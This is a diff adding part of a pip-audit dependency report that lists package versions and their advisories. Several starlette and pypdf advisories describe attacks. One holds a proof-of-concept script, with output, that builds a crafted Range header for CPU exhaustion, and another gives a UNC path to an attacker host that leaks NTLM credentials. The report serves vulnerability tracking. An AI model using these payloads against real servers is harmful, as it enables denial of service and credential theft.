+          "id": "GHSA-6vvc-x485-93v7",
+          "fix_versions": [
+            "6.21.0"
+          ],
+          "aliases": [
+            "CVE-2026-113789"
+          ],
+          "description": "### Impact  An attacker who uses this vulnerability can craft a PDF which leads to large memory usage and/or long runtimes. This requires retrieving the form fields of a document.  ### Patches  This has been fixed in [pypdf==6.21.0](https://github.com/py-pdf/pypdf/releases/tag/6.21.0).  ### Workarounds  If you cannot upgrade yet, consider applying the changes from PR [#4219](https://github.com/py-pdf/pypdf/pull/4219)."
+        },
+        {
+          "id": "GHSA-6c7f-9265-g8fw",
+          "fix_versions": [
+            "6.21.2"
+          ],
+          "aliases": [
+            "CVE-2026-115572"
+          ],
+          "description": "### Impact  An attacker who uses this vulnerability can craft a PDF which leads to long runtimes. This requires loading relevant parts of a file (like their pages) where the same, but non-existent indirect object is referenced multiple times.  ### Patches  This has been fixed in [pypdf==6.21.2](https://github.com/py-pdf/pypdf/releases/tag/6.21.2).  ### Workarounds  If you cannot upgrade yet, consider applying the changes from PR [#4240](https://github.com/py-pdf/pypdf/pull/4240)."
+        },
+        {
+          "id": "GHSA-jr96-gvgh-j3r4",
+          "fix_versions": [
+            "6.21.2"
+          ],
+          "aliases": [
+            "CVE-2026-115585"
+          ],
+          "description": "### Impact  An attacker who uses this vulnerability can craft a PDF which leads to long runtimes. This requires cross-reference streams with repeated malformed cross-reference streams.  ### Patches  This has been fixed in [pypdf==6.21.2](https://github.com/py-pdf/pypdf/releases/tag/6.21.2).  ### Workarounds  If you cannot upgrade yet, consider applying the changes from PR [#4240](https://github.com/py-pdf/pypdf/pull/4240).  ### Notes  This is a follow-up to https://github.com/py-pdf/pypdf/security/advisories/GHSA-55h5-xmcq-c37v, which had the side-effect of still loading the whole stream again despite the cache being present."
+        },
+        {
+          "id": "GHSA-gmh7-3g9r-mjh5",
+          "fix_versions": [
+            "6.21.2"
+          ],
+          "aliases": [
+            "CVE-2026-115580"
+          ],
+          "description": "### Impact  An attacker who uses this vulnerability can craft a PDF which leads to long runtimes. This requires opening a file with large/wrong upper limits in the xref table.  ### Patches  This has been fixed in [pypdf==6.21.2](https://github.com/py-pdf/pypdf/releases/tag/6.21.2).  ### Workarounds  If you cannot upgrade yet, consider applying the changes from PR [#4239](https://github.com/py-pdf/pypdf/pull/4239)."
+        }
+      ]
+    },
+    {
+      "name": "pytest",
+      "version": "9.1.1",
+      "vulns": []
+    },
+    {
+      "name": "python-dateutil",
+      "version": "3.0.0",
+      "vulns": []
+    },
+    {
+      "name": "python-dotenv",
+      "version": "1.2.2",
+      "vulns": []
+    },
+    {
+      "name": "python-multipart",
+      "version": "0.0.31",
+      "vulns": []
+    },
+    {
+      "name": "pytz",
+      "version": "2026.5",
+      "vulns": []
+    },
+    {
+      "name": "pyyaml",
+      "version": "6.0.3",
+      "vulns": []
+    },
+    {
+      "name": "rapidfuzz",
+      "version": "3.14.5",
+      "vulns": []
+    },
+    {
+      "name": "redis",
+      "version": "5.3.1",
+      "vulns": []
+    },
+    {
+      "name": "regex",
+      "version": "2026.9.29",
+      "vulns": []
+    },
+    {
+      "name": "reportlab",
+      "version": "5.0.1",
+      "vulns": []
+    },
+    {
+      "name": "requests",
+      "version": "2.33.1",
+      "vulns": []
+    },
+    {
+      "name": "requests-oauthlib",
+      "version": "2.0.0",
+      "vulns": []
+    },
+    {
+      "name": "sentry-sdk",
+      "version": "2.58.0",
+      "vulns": []
+    },
+    {
+      "name": "sgmllib3k",
+      "version": "1.0.0",
+      "vulns": []
+    },
+    {
+      "name": "six",
+      "version": "1.17.0",
+      "vulns": []
+    },
+    {
+      "name": "slowapi",
+      "version": "0.1.9",
+      "vulns": []
+    },
+    {
+      "name": "sniffio",
+      "version": "1.3.1",
+      "vulns": []
+    },
+    {
+      "name": "soupsieve",
+      "version": "3.0.4",
+      "vulns": []
+    },
+    {
+      "name": "sqlalchemy",
+      "version": "2.0.49",
+      "vulns": []
+    },
+    {
+      "name": "starlette",
+      "version": "0.41.3",
+      "vulns": [
+        {
+          "id": "PYSEC-2026-161",
+          "fix_versions": [
+            "1.0.1"
+          ],
+          "aliases": [
+            "GHSA-86qp-5c8j-p5mr",
+            "CVE-2026-48710",
+            "X41-2026-002"
+          ],
+          "description": "Starlette reconstructs the requested URL based on the HTTP Host request header and requested path, but does not perform any validation of the Host header value. This allows attackers to inject paths into the host part, prepending the actual path. However, routing in Starlette is based on the actual request path. This inconsistent interpretation of HTTP requests may lead to issues such as authentication bypass when the authentication depends on the reconstructed URL’s path."
+        },
+        {
+          "id": "PYSEC-2026-249",
+          "fix_versions": [
+            "1.3.1"
+          ],
+          "aliases": [
+            "CVE-2026-54283",
+            "GHSA-82w8-qh3p-5jfq"
+          ],
+          "description": "Starlette is a lightweight ASGI framework/toolkit. From 0.4.1 until 1.3.1, request.form() accepts max_fields and max_part_size to bound resource consumption while parsing form data. These limits are enforced for multipart/form-data, but silently ignored for application/x-www-form-urlencoded. An unauthenticated attacker can therefore send a urlencoded body with an arbitrarily large number of fields or an arbitrarily large field, even when the application configured limits it believed would apply. This vulnerability is fixed in 1.3.1."
+        },
+        {
+          "id": "PYSEC-2026-248",
+          "fix_versions": [
+            "1.3.0"
+          ],
+          "aliases": [
+            "CVE-2026-54282",
+            "GHSA-jp82-jpqv-5vv3"
+          ],
+          "description": "Starlette is a lightweight ASGI framework/toolkit. Prior to 1.3.0, the HTTP request path is not validated before being used to reconstruct request.url. Because request.url is rebuilt by concatenating {scheme}://{host}{path} and re-parsing the result, a path that does not begin with / (for example @google.com) moves the authority boundary during re-parsing, so request.url.hostname and request.url.netloc become attacker-controlled. Code that reads request.url.hostname (rather than the Host header or scope) can therefore be misled into trusting an attacker-supplied host. This vulnerability is fixed in 1.3.0."
+        },
+        {
+          "id": "PYSEC-2026-1942",
+          "fix_versions": [
+            "0.49.1"
+          ],
+          "aliases": [
+            "CVE-2025-62727",
+            "GHSA-7f5h-v6xp-fcq8"
+          ],
+          "description": "### Summary An unauthenticated attacker can send a crafted HTTP Range header that triggers quadratic-time processing in Starlette's `FileResponse` Range parsing/merging logic. This enables CPU exhaustion per request, causing denial‑of‑service for endpoints serving files (e.g., `StaticFiles` or any use of `FileResponse`).  ### Details Starlette parses multi-range requests in ``FileResponse._parse_range_header()``, then merges ranges using an O(n^2) algorithm.  ```python # starlette/responses.py _RANGE_PATTERN = re.compile(r\"(\\d*)-(\\d*)\") # vulnerable to O(n^2) complexity ReDoS  class FileResponse(Response):     @staticmethod     def _parse_range_header(http_range: str, file_size: int) -> list[tuple[int, int]]:         ranges: list[tuple[int, int]] = []         try:             units, range_ = http_range.split(\"=\", 1)         except ValueError:             raise MalformedRangeHeader()          # [...]          ranges = [             (                 int(_[0]) if _[0] else file_size - int(_[1]),                 int(_[1]) + 1 if _[0] and _[1] and int(_[1]) < file_size else file_size,             )             for _ in _RANGE_PATTERN.findall(range_) # vulnerable             if _ != (\"\", \"\")         ]  ```  The parsing loop of ``FileResponse._parse_range_header()`` uses the regular expression which vulnerable to denial of service for its O(n^2) complexity. A crafted `Range` header can maximize its complexity.  The merge loop processes each input range by scanning the entire result list, yielding quadratic behavior with many disjoint ranges. A crafted Range header with many small, non-overlapping ranges (or specially shaped numeric substrings) maximizes comparisons.    This affects any Starlette application that uses:    - ``starlette.staticfiles.StaticFiles`` (internally returns `FileResponse`) — `starlette/staticfiles.py:178`   - Direct ``starlette.responses.FileResponse`` responses  ### PoC ```python #!/usr/bin/env python3  import sys import time  try:     import starlette     from starlette.responses import FileResponse except Exception as e:     print(f\"[ERROR] Failed to import starlette: {e}\")     sys.exit(1)   def build_payload(length: int) -> str:     \"\"\"Build the Range header value body: '0' * num_zeros + '0-'\"\"\"     return (\"0\" * length) + \"a-\"   def test(header: str, file_size: int) -> float:     start = time.perf_counter()     try:         FileResponse._parse_range_header(header, file_size)     except Exception:         pass     end = time.perf_counter()     elapsed = end - start     return elapsed   def run_once(num_zeros: int) -> None:     range_body = build_payload(num_zeros)     header = \"bytes=\" + range_body     # Use a sufficiently large file_size so upper bounds default to file size     file_size = max(len(range_body) + 10, 1_000_000)          print(f\"[DEBUG] range_body length: {len(range_body)} bytes\")     elapsed_time = test(header, file_size)     print(f\"[DEBUG] elapsed time: {elapsed_time:.6f} seconds\\n\")   if __name__ == \"__main__\":     print(f\"[INFO] Starlette Version: {starlette.__version__}\")     for n in [5000, 10000, 20000, 40000]:         run_once(n)  \"\"\" $ python3 poc_dos_range.py [INFO] Starlette Version: 0.48.0 [DEBUG] range_body length: 5002 bytes [DEBUG] elapsed time: 0.053932 seconds  [DEBUG] range_body length: 10002 bytes [DEBUG] elapsed time: 0.209770 seconds  [DEBUG] range_body length: 20002 bytes [DEBUG] elapsed time: 0.885296 seconds  [DEBUG] range_body length: 40002 bytes [DEBUG] elapsed time: 3.238832 seconds \"\"\" ```  ### Impact Any Starlette app serving files via FileResponse or StaticFiles; frameworks built on Starlette (e.g., FastAPI) are indirectly impacted when using file-serving endpoints. Unauthenticated remote attackers can exploit this via a single HTTP request with a crafted Range header."
+        },
+        {
+          "id": "PYSEC-2026-1941",
+          "fix_versions": [
+            "0.47.2"
+          ],
+          "aliases": [
+            "GHSA-2c2j-9gv5-cj73",
+            "CVE-2025-54121"
+          ],
+          "description": "### Summary When parsing a multi-part form with large files (greater than the [default max spool size](https://github.com/encode/starlette/blob/fa5355442753f794965ae1af0f87f9fec1b9a3de/starlette/formparsers.py#L126)) `starlette` will block the main thread to roll the file over to disk. This blocks the event thread which means we can't accept new connections.  ### Details Please see this discussion for details: https://github.com/encode/starlette/discussions/2927#discussioncomment-13721403. In summary the following UploadFile code (copied from [here](https://github.com/encode/starlette/blob/fa5355442753f794965ae1af0f87f9fec1b9a3de/starlette/datastructures.py#L436C5-L447C14)) has a minor bug. Instead of just checking for `self._in_memory` we should also check if the additional bytes will cause a rollover.  ```python      @property     def _in_memory(self) -> bool:         # check for SpooledTemporaryFile._rolled         rolled_to_disk = getattr(self.file, \"_rolled\", True)         return not rolled_to_disk      async def write(self, data: bytes) -> None:         if self.size is not None:             self.size += len(data)          if self._in_memory:             self.file.write(data)         else:             await run_in_threadpool(self.file.write, data) ```  I have already created a PR which fixes the problem: https://github.com/encode/starlette/pull/2962   ### PoC See the discussion [here](https://github.com/encode/starlette/discussions/2927#discussioncomment-13721403) for steps on how to reproduce.  ### Impact To be honest, very low and not many users will be impacted. Parsing large forms is already CPU intensive so the additional IO block doesn't slow down `starlette` that much on systems with modern HDDs/SSDs. If someone is running on tape they might see a greater impact."
+        },
+        {
+          "id": "PYSEC-2026-2281",
+          "fix_versions": [
+            "1.1.0"
+          ],
+          "aliases": [
+            "GHSA-wqp7-x3pw-xc5r",
+            "CVE-2026-48818"
+          ],
+          "description": "Starlette is a lightweight ASGI framework/toolkit. In versions 1.0.1 and earlier, StaticFiles on Windows is vulnerable to SSRF. An UNC path such as \\\\attacker.com\\share can cause os.path.realpath to initiate an outbound SMB connection before the path is rejected, exposing the service account’s NTLMv2 credentials for offline cracking or relay even though the HTTP response is only a 404. The issue affects default follow_symlink=False deployments, including frameworks built on Starlette such as FastAPI; POSIX systems and follow_symlink=True are unaffected. The issue is fixed in 1.1.0."
+        },
+        {
+          "id": "PYSEC-2026-2280",
+          "fix_versions": [
+            "1.1.0"
+          ],
+          "aliases": [
+            "CVE-2026-48817",
+            "GHSA-x746-7m8f-x49c"
+          ],
+          "description": "Starlette is a lightweight ASGI framework/toolkit. In versions 1.0.1 and below, when dispatching a request, HTTPEndpoint selects the handler by lowercasing the HTTP method and looking it up as an attribute with getattr, without restricting the lookup to a known set of HTTP verbs. When an HTTPEndpoint subclass is registered through Route(...) without an explicit methods= argument, the route does not constrain the method and every method reaches the endpoint. If a non-standard HTTP method whose lowercased name matches an attribute on the endpoint subclass reaches the endpoint, that attribute is invoked as if it were a request handler. An attacker can use this to reach methods that were never meant to be HTTP handlers, such as internal helpers, without the authorization checks applied by the intended public handler. An application (including Starlette-based frameworks like FastAPI) is affected if it registers an HTTPEndpoint subclass via Route(...) without explicitly setting methods=, and that subclass includes extra methods named like non-standard HTTP verbs that take one request argument and return a response. This issue has been fixed in version 1.1.0."
+        }
+      ]
+    },
+    {
+      "name": "structlog",
+      "version": "24.4.0",
+      "vulns": []
+    },
+    {
+      "name": "tenacity",
+      "version": "9.1.4",
+      "vulns": []
+    },
+    {
+      "name": "toolz",
+      "version": "1.2.0",
+      "vulns": []
+    },
+    {
+      "name": "tqdm",
+      "version": "4.70.1",
+      "vulns": []
+    },
+    {
+      "name": "typing-extensions",
+      "version": "4.15.0",
+      "vulns": []
+    },
+    {
+      "name": "typing-inspection",
+      "version": "0.4.4",
+      "vulns": []
+    },
+    {
+      "name": "tzdata",
+      "version": "2026.5",
+      "vulns": []
+    },
+    {
+      "name": "uritemplate",
+      "version": "4.2.0",
+      "vulns": []
+    },
+    {
+      "name": "urllib3",
+      "version": "2.8.0",
+      "vulns": []
+    },
+    {
+      "name": "uvicorn",
+      "version": "0.32.1",
+      "vulns": []
+    },
+    {
+      "name": "uvloop",
+      "version": "0.21.0",
+      "vulns": []
+    },
+    {
+      "name": "watchfiles",
+      "version": "1.3.0",
+      "vulns": []
+    },
+    {
+      "name": "websockets",
+      "version": "13.1",
+      "vulns": []
+    },
+    {
+      "name": "wrapt",
+      "version": "1.17.3",
+      "vulns": []
+    },
+    {
+      "name": "yarl",
+      "version": "1.25.1",
+      "vulns": []
+    },
+    {
+      "name": "yfinance",
+      "version": "0.2.66",
+      "vulns": []
+    },
+    {
+      "name": "zipp",
+      "version": "4.1.2",
+      "vulns": []
+    }
+  ],
+  "fixes": [],
+  "provenance": {
+    "schema": "tfb.dependency-health.v1",
+    "baseline_commit": "561db60c74c1d56d866d4b72756f8ef9a9df57d5",
+    "stage": "baseline",
+    "scope": "installed-audit",
+    "requirements_sha256": "ce6475adbf932851e5023a627095e901dba4e1d5165d2d1ef4e2c86812e2835f",
+    "source_report_sha256": "172fd2681ebc19cf9fbded3edd1db72f477e63a46dacbcfcacf352a1e11be791",
+    "completed_utc": "2026-10-24T08:58:12.478960+00:00",
+    "python_version": "3.12.14",
+    "test_extras": [
+      "pytest==9.1.1",
+      "openpyxl==3.1.5",
+      "reportlab==5.0.1",
+      "pypdf==6.20.0"
+    ],
+    "tool": "pip-audit",
+    "tool_version": "2.9.0",
+    "audit_exit_code": 1,
+    "audit_command_scope": "isolated site-packages path including bootstrap pip and CI test extras"
+  }
+}
